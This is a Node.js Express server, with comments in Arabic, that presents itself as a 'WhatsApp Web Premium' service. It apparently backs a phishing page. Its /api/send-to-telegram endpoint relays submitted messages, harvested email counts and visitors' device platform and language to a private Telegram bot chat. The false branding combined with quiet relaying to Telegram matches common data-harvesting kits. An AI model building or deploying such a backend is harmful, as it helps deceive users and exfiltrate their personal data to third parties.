const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.static('.')); // خدمة الملفات من المجلد الحالي
app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API للتلجرام
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message, data } = req.body;
        
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.json({ 
                success: false, 
                error: 'Telegram config missing' 
            });
        }

        // رسالة مبسطة للتلجرام
        const telegramMessage = `
${message}

📧 الإيميلات: ${data.emails?.length || 0}
📱 الجهاز: ${data.deviceInfo?.platform || 'غير معروف'}
🌍 اللغة: ${data.deviceInfo?.language || 'غير معروف'}

⏰ ${new Date().toLocaleString('ar-SA')}
        `.trim();

        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage
            })
        });

        const result = await telegramResponse.json();
        
        res.json({ success: true, result });

    } catch (error) {
        console.error('Error:', error);
        res.json({ success: false, error: error.message });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'WhatsApp Web Premium',
        timestamp: new Date().toISOString()
    });
});

// بدء السيرفر
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
});
